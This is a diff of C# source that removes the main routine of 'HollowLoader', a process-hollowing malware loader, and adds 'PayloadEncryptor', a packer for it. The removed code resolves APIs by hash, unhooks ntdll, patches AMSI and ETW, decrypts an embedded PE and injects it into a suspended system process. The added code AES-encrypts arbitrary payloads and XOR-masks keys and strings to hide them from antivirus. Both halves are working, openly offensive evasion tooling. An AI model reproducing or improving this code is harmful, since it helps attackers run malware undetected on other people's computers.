@@ -1,110 +1,205 @@
 using System;
 using System.IO;
-using System.Runtime.InteropServices;
+using System.Security.Cryptography;
 
-namespace HollowLoader
+namespace PayloadEncryptor
 {
     /// <summary>
-    /// Evasive AES-encrypted process hollowing loader.
+    /// Generates the AES-256-CBC encrypted payload blob and C# source used by
+    /// HollowLoader, plus an FNV-1a hash utility for adding API resolutions.
     ///
     /// Usage:
-    ///   HollowLoader.exe                    (use embedded Payload.cs)
-    ///   HollowLoader.exe --payload blob.bin (encrypted blob: key(32)||iv(16)||ct)
-    ///   HollowLoader.exe --process calc.exe
-    ///   HollowLoader.exe --args "-k netsvcs"
-    ///   HollowLoader.exe --debug
-    ///
-    /// Execution chain:
-    ///   resolve APIs by hash (PEB walk) -> unhook ntdll / patch AMSI+ETW ->
-    ///   AES-256-CBC decrypt -> map PE into suspended sacrificial process ->
-    ///   resume. No payload or API-name strings exist in plaintext in the file.
+    ///   PayloadEncryptor <input.bin> [output.cs] [--mask 0xAA]
+    ///       Encrypts a raw PE payload and writes a Payload.cs source file
+    ///       (encrypted bytes + XOR-masked key/IV) for the HollowLoader project.
+    ///   PayloadEncryptor --blob <input.bin> [output.bin]
+    ///       Writes a standalone blob: key(32)||iv(16)||ciphertext (for
+    ///       HollowLoader.exe --payload).
+    ///   PayloadEncryptor --hash <FunctionName>
+    ///       Prints the FNV-1a hash used by the runtime API resolver.
+    ///   PayloadEncryptor --str <Text>
+    ///       Prints the XOR-obfuscated UTF-16LE bytes used by Obf.
     /// </summary>
     internal static class Program
     {
-        [STAThread]
+        private const byte DefaultMask = 0xAA;
+
         private static void Main(string[] args)
         {
-            string payloadFile = null;
-            string target = Config.DefaultTarget;
-            string targetArgs = "";
-            bool debug = false;
-
-            for (int i = 0; i < args.Length; i++)
-            {
-                switch (args[i])
-                {
-                    case "--payload": if (i + 1 < args.Length) payloadFile = args[++i]; break;
-                    case "--process": if (i + 1 < args.Length) target = args[++i]; break;
-                    case "--args": if (i + 1 < args.Length) targetArgs = args[++i]; break;
-                    case "--debug": debug = true; break;
-                }
-            }
-
-            if (Config.StartupDelayMs > 0)
-                System.Threading.Thread.Sleep(Config.StartupDelayMs + new Random().Next(0, 1500));
-
-            // 1. Resolve every API by hash — no sensitive imports/strings
-            Win32 api = Win32.Resolve();
-            if (api == null)
-            {
-                Evasion.Log(debug, "[!] API resolution failed");
-                return;
-            }
-
-            // 2. Evasion layers
-            Evasion.Apply(api, debug);
-
-            // 3. Obtain and decrypt the payload
-            byte[] ciphertext;
-            byte[] key;
-            byte[] iv;
-            if (payloadFile != null && File.Exists(payloadFile))
-            {
-                byte[] blob = File.ReadAllBytes(payloadFile);
-                if (blob.Length < 48)
-                {
-                    Evasion.Log(debug, "[!] payload blob too small");
-                    return;
-                }
-                key = new byte[32];
-                iv = new byte[16];
-                Buffer.BlockCopy(blob, 0, key, 0, 32);
-                Buffer.BlockCopy(blob, 32, iv, 0, 16);
-                ciphertext = new byte[blob.Length - 48];
-                Buffer.BlockCopy(blob, 48, ciphertext, 0, ciphertext.Length);
-            }
-            else
-            {
-                ciphertext = Payload.Encrypted;
-                key = Crypto.Unmask(Payload.Key);
-                iv = Crypto.Unmask(Payload.Iv);
-            }
-
-            byte[] rawPe;
             try
             {
-                rawPe = Crypto.AesDecrypt(ciphertext, key, iv);
+                if (args.Length >= 2 && args[0] == "--hash")
+                {
+                    Console.WriteLine("0x{0:X8}", Fnv1a(args[1]));
+                    return;
+                }
+                if (args.Length >= 2 && args[0] == "--str")
+                {
+                    byte key = ParseMask(args);
+                    byte[] enc = Xor(args[1], key);
+                    Console.Write("// \"{0}\" (key 0x{1:X2})\n", args[1], key);
+                    for (int i = 0; i < enc.Length; i++)
+                    {
+                        Console.Write("0x{0:X2}", enc[i]);
+                        if (i != enc.Length - 1) Console.Write(", ");
+                        if ((i + 1) % 12 == 0) Console.WriteLine();
+                    }
+                    Console.WriteLine();
+                    return;
+                }
+                if (args.Length >= 2 && args[0] == "--blob")
+                {
+                    BlobMode(args[1], args.Length >= 3 ? args[2] : "payload.bin");
+                    return;
+                }
+                if (args.Length < 1)
+                {
+                    PrintUsage();
+                    return;
+                }
+
+                byte[] raw = File.ReadAllBytes(args[0]);
+                if (raw.Length == 0) throw new Exception("input file is empty");
+
+                using (Aes aes = Aes.Create())
+                {
+                    aes.KeySize = 256;
+                    aes.BlockSize = 128;
+                    aes.Mode = CipherMode.CBC;
+                    aes.Padding = PaddingMode.PKCS7;
+                    aes.GenerateKey();
+                    aes.GenerateIV();
+
+                    byte[] key = aes.Key;   // 32 bytes
+                    byte[] iv = aes.IV;     // 16 bytes
+                    byte[] ct;
+                    using (ICryptoTransform enc = aes.CreateEncryptor())
+                        ct = enc.TransformFinalBlock(raw, 0, raw.Length);
+
+                    byte mask = ParseMask(args);
+                    string outCs = args.Length >= 2 && args[0] != "--blob" ? args[1] : "Payload.cs";
+                    WritePayloadCs(outCs, ct, Xor(key, mask), Xor(iv, mask), mask);
+
+                    Console.WriteLine("[+] encrypted {0} bytes -> ciphertext {1} bytes", raw.Length, ct.Length);
+                    Console.WriteLine("[+] wrote {0}", outCs);
+                    Console.WriteLine("[+] rebuild HollowLoader and run. key/iv are XOR-masked with 0x{0:X2}", mask);
+                }
             }
             catch (Exception ex)
             {
-                Evasion.Log(debug, "[!] AES decrypt failed: " + ex.Message);
-                return;
+                Console.Error.WriteLine("[-] error: " + ex.Message);
+                Environment.Exit(1);
             }
-            Evasion.Log(debug, "[*] decrypted " + rawPe.Length + " bytes");
+        }
 
-            // 4. Hollow the sacrificial process
-            string targetPath = Path.Combine(Environment.SystemDirectory, target);
-            if (Path.IsPathRooted(target)) targetPath = target;
-
-            bool ok = Hollowing.Run(api, rawPe, targetPath, targetArgs, debug);
-            if (!ok)
+        private static void BlobMode(string input, string output)
+        {
+            byte[] raw = File.ReadAllBytes(input);
+            using (Aes aes = Aes.Create())
             {
-                Evasion.Log(debug, "[!] hollowing failed");
-                return;
+                aes.KeySize = 256;
+                aes.BlockSize = 128;
+                aes.Mode = CipherMode.CBC;
+                aes.Padding = PaddingMode.PKCS7;
+                aes.GenerateKey();
+                aes.GenerateIV();
+                byte[] ct;
+                using (ICryptoTransform enc = aes.CreateEncryptor())
+                    ct = enc.TransformFinalBlock(raw, 0, raw.Length);
+                using (var fs = new FileStream(output, FileMode.Create))
+                {
+                    fs.Write(aes.Key, 0, aes.Key.Length);
+                    fs.Write(aes.IV, 0, aes.IV.Length);
+                    fs.Write(ct, 0, ct.Length);
+                }
+                Console.WriteLine("[+] wrote {0} bytes -> {1}", aes.Key.Length + aes.IV.Length + ct.Length, output);
+                Console.WriteLine("[+] load with: HollowLoader.exe --payload {0}", output);
             }
+        }
 
-            // Terminate hard: skip CLR shutdown / finalizers that could trip AV
-            Environment.Exit(0);
+        private static void WritePayloadCs(string path, byte[] ct, byte[] maskedKey, byte[] maskedIv, byte mask)
+        {
+            using (var w = new StreamWriter(path))
+            {
+                w.WriteLine("// AUTO-GENERATED by PayloadEncryptor — do not edit by hand.");
+                w.WriteLine("// AES-256-CBC encrypted payload. Key/IV stored XOR-masked (mask 0x{0:X2}).", mask);
+                w.WriteLine("using System;");
+                w.WriteLine();
+                w.WriteLine("namespace HollowLoader");
+                w.WriteLine("{");
+                w.WriteLine("    internal static class Payload");
+                w.WriteLine("    {");
+                w.WriteLine("        internal static readonly byte[] Key = new byte[]");
+                w.WriteLine("        {");
+                WriteBytes(w, maskedKey, "            ");
+                w.WriteLine("        };");
+                w.WriteLine();
+                w.WriteLine("        internal static readonly byte[] Iv = new byte[]");
+                w.WriteLine("        {");
+                WriteBytes(w, maskedIv, "            ");
+                w.WriteLine("        };");
+                w.WriteLine();
+                w.WriteLine("        internal static readonly byte[] Encrypted = new byte[]");
+                w.WriteLine("        {");
+                WriteBytes(w, ct, "            ");
+                w.WriteLine("        };");
+                w.WriteLine("    }");
+                w.WriteLine("}");
+            }
+        }
+
+        private static void WriteBytes(StreamWriter w, byte[] data, string indent)
+        {
+            for (int i = 0; i < data.Length; i++)
+            {
+                w.Write("0x{0:X2}", data[i]);
+                if (i != data.Length - 1) w.Write(", ");
+                if ((i + 1) % 16 == 0) { w.WriteLine(); w.Write(indent); }
+            }
+            w.WriteLine();
+        }
+
+        private static uint Fnv1a(string name)
+        {
+            uint hash = 0x811C9DC5;
+            foreach (char c in name.ToLowerInvariant())
+            {
+                hash ^= c;
+                hash *= 0x01000193;
+            }
+            return hash;
+        }
+
+        private static byte[] Xor(byte[] data, byte key)
+        {
+            byte[] outb = new byte[data.Length];
+            for (int i = 0; i < data.Length; i++) outb[i] = (byte)(data[i] ^ key);
+            return outb;
+        }
+
+        private static byte[] Xor(string s, byte key)
+        {
+            return Xor(System.Text.Encoding.Unicode.GetBytes(s), key);
+        }
+
+        private static byte ParseMask(string[] args)
+        {
+            for (int i = 0; i < args.Length - 1; i++)
+            {
+                if (args[i] == "--mask")
+                    return Convert.ToByte(args[i + 1].Replace("0x", ""), 16);
+            }
+            return DefaultMask;
+        }
+
+        private static void PrintUsage()
+        {
+            Console.WriteLine("PayloadEncryptor — AES-256-CBC payload packer for HollowLoader");
+            Console.WriteLine();
+            Console.WriteLine("  PayloadEncryptor <input.bin> [output.cs] [--mask 0xAA]");
+            Console.WriteLine("  PayloadEncryptor --blob <input.bin> [output.bin]");
+            Console.WriteLine("  PayloadEncryptor --hash <FunctionName>");
+            Console.WriteLine("  PayloadEncryptor --str <Text> [--mask 0x5A]");
         }
     }
 }
